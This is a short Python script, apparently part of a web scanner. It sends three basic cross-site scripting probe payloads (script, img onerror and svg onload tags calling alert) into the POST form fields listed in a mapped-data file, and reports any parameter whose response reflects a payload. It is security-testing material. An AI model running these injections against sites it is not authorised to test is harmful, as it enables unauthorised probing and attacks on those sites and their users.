import requests
import json

# Load mapped website data
with open("mapped_data.json", "r") as f:
    mapped_data = json.load(f)

# XSS Payloads
xss_payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>"
]

print("\n🔍 Scanning for XSS vulnerabilities...\n")

# Iterate over all discovered forms
for entry in mapped_data:
    if entry["method"] == "POST" and entry["inputs"]:  # Ensure form has inputs
        target_url = entry["url"]
        print(f"📌 Testing: {target_url}")

        # Test each input field
        for param in entry["inputs"]:
            print(f"🛠️  Testing parameter: {param}")

            for payload in xss_payloads:
                print(f"🚀 Injecting: {payload}")
                data = {param: payload}

                try:
                    response = requests.post(target_url, data=data)

                    # Check if the payload is reflected in the response
                    if payload in response.text:
                        print(f"⚠️  XSS Vulnerability Detected in {target_url}!")
                        print(f"🛡️  Vulnerable Parameter: {param}")
                        print(f"🚀 Payload: {payload}\n")
                        break  # Stop testing if we find an issue
                except Exception as e:
                    print(f"❌ Error: {e}")

print("\n✅ Scan complete!")
